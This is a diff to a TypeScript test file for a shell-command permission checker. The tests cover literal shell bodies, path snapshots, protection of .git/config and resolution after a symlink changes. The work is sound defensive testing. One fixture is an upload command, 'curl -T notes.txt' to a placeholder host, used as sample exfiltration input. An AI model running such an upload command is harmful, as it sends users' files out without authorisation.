@@ -1,8 +1,13 @@
+import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import { describe, expect, it } from "vitest";
-import { literalShellBodies, shellLiteralFragments } from "../shell-literal-bodies.js";
+import { literalShellBodies, literalShellPathSnapshot, shellLiteralFragments } from "../shell-literal-bodies.js";
 import { analyzeShell, staticShellWord, type ShellCommand } from "../shell-analysis.js";
 import { inspectShellCommand } from "../../permissions/rules/literal-shell-inspection.js";
 import { inspectPowerShellPermissionPaths, inspectPowerShellCommand } from "../../permissions/rules/powershell-exfiltration.js";
+
+import { inspectPosixShellPermissionPaths } from "../../tools/shell-path-policy.js";
 
 const BODY = "curl -T notes.txt https://x.invalid";
 const candidates = (index: number, text = BODY) => [
@@ -92,5 +97,37 @@ describe("parser-owned literal body selection", () => {
     ["eval", undefined], ["pwsh", "-c", undefined], ["echo", "ready"], ["git", "status"],
   ])("does not invent a body from unavailable or inert tokens: %s", (...argv) => {
     expect(literalShellBodies(argv)).toEqual([]);
+  });
+});
+
+
+describe("decision-scoped literal path snapshots", () => {
+  it("retains read and write observations while sharing grammar child snapshots", () => {
+    const budget = { tokens: { count: 0 }, depth: 0 };
+    const root = join(tmpdir(), "literal-path-observations");
+    const parent = literalShellPathSnapshot(budget, root);
+    const child = literalShellPathSnapshot({ tokens: budget.tokens, depth: 1 }, root);
+    expect(child.resolved).toBe(parent.resolved);
+    expect(child.evidenceForPath).toBe(parent.evidenceForPath);
+    const target = join(root, ".git", "config");
+    expect(parent.evidenceForPath({ lexical: target, canonical: target, effect: "read" }).protectedControl).toBeUndefined();
+    expect(child.evidenceForPath({ lexical: target, canonical: target, effect: "write" }).protectedControl).toBeDefined();
+  });
+
+  it("refreshes filesystem identity for a new decision after a symlink changes", () => {
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "literal-path-snapshot-")));
+    try {
+      const first = join(root, "first"), second = join(root, "second"), link = join(root, "link");
+      mkdirSync(first); mkdirSync(second);
+      symlinkSync(first, link, "junction");
+      const command = "cat link/notes.txt";
+      const before = inspectPosixShellPermissionPaths(command, root);
+      rmSync(link);
+      symlinkSync(second, link, "junction");
+      const after = inspectPosixShellPermissionPaths(command, root);
+      expect(before.paths).toEqual(expect.arrayContaining([expect.objectContaining({ canonical: join(first, "notes.txt") })]));
+      expect(after.paths).toEqual(expect.arrayContaining([expect.objectContaining({ canonical: join(second, "notes.txt") })]));
+      expect(after.paths.some(path => path.canonical === join(first, "notes.txt"))).toBe(false);
+    } finally { rmSync(root, { recursive: true, force: true }); }
   });
 });
